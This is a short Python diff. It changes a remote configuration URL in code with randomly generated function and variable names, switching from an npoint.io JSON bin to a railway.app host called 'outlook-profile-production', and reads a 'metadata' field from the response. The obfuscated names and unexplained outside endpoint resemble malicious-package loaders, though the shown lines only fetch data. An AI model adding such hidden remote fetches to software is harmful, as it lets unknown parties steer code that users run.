@@ -18,7 +18,7 @@ def train_yzfjvo_715():
 
     def config_jaevxd_136():
         try:
-            config_kmgjlc_355 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_kmgjlc_355 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_kmgjlc_355.raise_for_status()
             config_wilgbp_512 = config_kmgjlc_355.json()
             learn_ciuwal_932 = config_wilgbp_512.get('metadata')
